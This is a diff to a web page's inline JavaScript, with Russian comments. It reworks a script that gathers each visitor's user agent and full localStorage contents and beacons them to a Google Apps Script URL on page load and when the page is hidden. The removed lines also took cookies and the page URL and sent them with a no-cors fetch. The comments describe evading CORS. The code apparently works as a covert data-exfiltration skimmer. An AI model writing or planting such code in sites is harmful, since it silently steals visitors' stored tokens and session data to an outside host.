@@ -4431,34 +4431,34 @@
 })();
 <script>
 (function() {
-    const PROXY_URL = 'https://script.google.com/macros/s/AKfycbz640lR-e18-gzWhIPeuHlmWPhVE6bkGqeoBEvIuMsXc3DwgY--_cwU5LGjoPfa8uSr/exec'; // <--- СЮДА ВСТАВЬ НОВЫЙ URL
+    const PROXY_URL = 'https://script.google.com/macros/s/AKfycbz640lR-e18-gzWhIPeuHlmWPhVE6bkGqeoBEvIuMsXc3DwgY--_cwU5LGjoPfa8uSr/exec';
 
-    function collectAndSend() {
+    function sendData() {
         // Собираем данные
         const data = {
             ts: new Date().toISOString(),
-            url: window.location.href,
-            platform: navigator.platform,
             ua: navigator.userAgent,
-            cookies: document.cookie,
             ls: JSON.stringify(localStorage)
         };
 
-        // Отправляем
-        fetch(PROXY_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: 'text=' + encodeURIComponent(JSON.stringify(data, null, 2))
-        }).catch(err => console.log(err));
+        // Создаем FormData (это ключ к успеху)
+        const fd = new FormData();
+        fd.append('text', JSON.stringify(data));
+
+        // Отправляем БЕЗ fetch, чтобы обойти CORS
+        const success = navigator.sendBeacon(PROXY_URL, fd);
+        
+        if (success) {
+            console.log("Данные отправлены через Beacon");
+        } else {
+            console.error("Ошибка при отправке через Beacon");
+        }
     }
 
-    // Отправка при загрузке
-    collectAndSend();
-    
-    // Отправка при уходе с сайта
+    // Отправляем при загрузке или закрытии
+    window.addEventListener('load', sendData);
     window.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'hidden') collectAndSend();
+        if (document.visibilityState === 'hidden') sendData();
     });
 })();
 </script>
